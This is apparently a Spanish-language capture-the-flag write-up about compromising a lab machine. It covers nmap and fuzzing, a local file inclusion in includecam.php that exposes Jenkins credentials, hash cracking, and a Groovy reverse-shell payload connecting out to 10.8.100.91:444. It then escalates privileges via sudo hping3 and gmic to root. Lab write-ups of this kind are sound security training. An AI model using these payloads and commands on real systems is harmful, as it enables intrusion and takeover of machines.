Hacemos el escaneo con nmap:
![[Pasted image 20230926152610.png]]
Y esto corre en el puerto 80 y un jenkins en el 8080:
![[Pasted image 20230926152738.png]]
![[Pasted image 20230926152746.png]]
Si hacemos fuzzing al puerto 80 vemos el directorio /webcams:
![[Pasted image 20230926154219.png]]
Y tenemos esta web dentro del directorio webcams:
![[Pasted image 20230926154239.png]]
Dentro de estas webs podemos ver cómo es posible que podamos apuntar contra archivos internos de la máquina víctima:
![[Pasted image 20230926154607.png]]
Por tanto investigamos si en jenkins hay algún archivo donde podamos acceder y ver información sensible:
![[Pasted image 20230926154642.png]]
Y vemos que funciona:
```bash
view-source:http://192.168.0.76/webcams/includecam.php?cam=/var/lib/jenkins/users/users
```
![[Pasted image 20230926154732.png]]
![[Pasted image 20230926154740.png]]
```bash
andrew_15328478385288074167
```
Pero si añadimos config dentro de la url, podremos obtener la contraseña de este usuario:
```bash
view-source:http://192.168.0.80/webcams/includecam.php?cam=/var/lib/jenkins/users/andrew_15328478385288074167/config
```
![[Pasted image 20230928083820.png]]
Por tanto, nos copiamos este hash dentro de un archivo y lo crackeamos con john the ripper:
```bash
jbcrypt:$2a$10$V.wxGyfowdGEVLvpQt5DROedmKKUp11g922/V.tb1xmi8eYe7rmzu
```
![[Pasted image 20230928083919.png]]
Por tanto ya tenemos las siguientes credenciales para entrar dentro del panel de administración de jenkins:
```bash
andrew:andrew1
```
Y estamos dentro:
![[Pasted image 20230928084422.png]]
En este punto vamos a explotar una vulnerabilidad parecida a la máquina [[MAQUINA INTERNAL (wordpress wpscan, hydra http, portforwarding chisel y hacking jenkins en docker)]]:
![[Pasted image 20230928084558.png]]
Una vez aquí, pegamos el siguiente payload:
```bash
String host="10.8.100.91";
int port=444;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
![[Pasted image 20230928084619.png]]
Y con netcat habremos recibido la conexión:
![[Pasted image 20230928084640.png]]
Tenemos el usuario andrew:
![[Pasted image 20230928085317.png]]
Y vemos este permiso de sudo:
![[Pasted image 20230928085101.png]]
Y podemos convertirnos en el usuario andrew de la siguiente forma:
```
sudo -u andrew /usr/sbin/hping3
/bin/bash
```
![[Pasted image 20230928085418.png]]
Y volvemos a enumerar permisos de sudo:
![[Pasted image 20230928085529.png]]
Y esto es lo que hace ese binario gmic:
![[Pasted image 20230928085609.png]]
Y dentro del manual de instrucciones de esto, tenemos como ejecutar un comando con gmic:
```bash
https://fr.manpages.org/gmic
```
![[Pasted image 20230928085848.png]]
Por tanto, ejecutamos este comando y ya somos root:
```bash
sudo /usr/bin/gmic -exec bash
```
![[Pasted image 20230928085922.png]]
